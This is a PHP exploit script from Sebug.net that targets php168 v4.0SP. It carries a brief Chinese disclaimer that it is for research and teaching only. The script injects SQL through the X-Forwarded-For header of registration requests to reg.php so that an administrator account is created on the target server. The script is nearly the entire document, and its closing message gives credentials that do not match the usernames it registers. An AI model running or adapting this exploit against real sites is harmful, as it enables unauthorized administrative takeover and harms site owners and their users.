Create New Admin Exploit FOR php168 v4.0SP

测试方法:

@Sebug.net   dis
本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.&lt;?php2.print_r(\"3.+------------------------------------------------------------------+4.Create New Admin Exploitphp168 v4.0SP5.+------------------------------------------------------------------+6.\");7.if ($argc<4) {8.	echo \"Usage: php \".$argv[0].\" host path uid\\n\";9.	echo \"host:      target server \\n\";10.	echo \"path:      path to php168\\n\";11.       echo \"uid:       the lastest uid\\n\";12.	echo \"Example:\\r\\n\";13.	echo \"php \".$argv[0].\" localhost /  120\\n\";14.	die;15.}16.$host=$argv[1];17.$path=$argv[2];18.$id=$argv[3]+2;19.$cmd = \"xxxx\',\'0\',\'111\',\'0\',\'1\',\'\', \'\', \'123\', \'123\', \'123\', \'123\', \'0\', \'\', \'0\', \'\', \'\', \'\', \'\'),(\'\".$id.\"\', \'0\', \'3\', \'\', \'1\', \'0\', \'\', \'1\', \'1\', \'1\', \'1\', \'1\', \'1\', \'1\', \'\', \'\', \'1\', \'1\', \'1\', \'1\', \'0\', \'\', \'0\', \'\', \'\', \'\', \'\')/*\";20.$contenta= \"username=sebug&email=dci1f@aa.ccom&password=testtest&password2=testtest&bday_y=&bday_m=&bday_d=&sex=0&oicq=&msn=&homepage=&Submit3=%CC%E1+%BD%BB&step=2\";21.$contentb= \"username=sebug_net&email=testffly@1s.com&password=xiaomi&password2=xiaomi&bday_y=&bday_m=&bday_d=&sex=0&oicq=&msn=&homepage=&Submit3=%CC%E1+%BD%BB&step=2\";22.senddate($contenta);23.senddate($contentb);24.function senddate($content){25.global $path,$host,$cmd;26.$data = \"POST \".$path.\"reg.php\".\" HTTP/1.1\\r\\n\";27.$data .= \"Accept: */*\\r\\n\";28.$data .= \"Accept-Language: zh-cn\\r\\n\";29.$data .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";30.$data .= \"User-Agent: Mozilla/4.0\\r\\n\";31.$data .= \"Host: \".$host.\"\\r\\n\";32.$data .= \"X-FORWARDED-FOR: \".$cmd.\"\\r\\n\";33.$data .= \"Content-length: \".strlen($content).\"\\r\\n\";34.$data .= \"Connection: Keep-Alive\\r\\n\";35.$data .= \"\\r\\n\";36.$data .= $content.\"\\r\\n\";37.$fd=fsockopen($host,80);38.if (!$fd) {39.	echo \'No response from \'.$host;40.	die;41.}42.fputs($fd,$data);43.fclose($fd);44.};45.echo \"done! the admin u create is testfly/testtest\";46.?&gt;